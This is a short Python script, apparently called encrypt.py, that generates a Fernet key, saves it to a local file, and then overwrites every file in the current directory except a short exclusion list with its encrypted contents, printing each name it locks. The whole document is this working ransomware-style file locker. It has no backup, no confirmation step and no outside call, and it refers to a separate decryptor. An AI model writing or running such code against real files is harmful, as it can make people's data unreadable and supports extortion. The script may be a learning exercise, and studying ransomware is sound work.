from cryptography.fernet import Fernet

key = Fernet.generate_key()
f = Fernet(key)

## write key to file
with open("enc_key","wb") as key_file:
    key_file.write(key)
    key_file.close()


def encrypt_data(file):
    with open(file,"rb") as myfile:
        file_data = myfile.read()
        #print(f"Raw data for file {file}: {file_data}")
        myfile.close()

    enc_data = f.encrypt(file_data)
    with open(file,"wb") as myfile: 
        myfile.write(enc_data)



    
# directory scan
import os
files = os.listdir()
enc_files = []
for file in files:
    if file in ["env","enc_key","encrypt.py","scripts","__pycache__","decrypt.py","images","app.py","bye.py",'.git']:
        continue
    else:
        encrypt_data(file)
        enc_files.append(file)
        print("[+] Encrypted:",file)

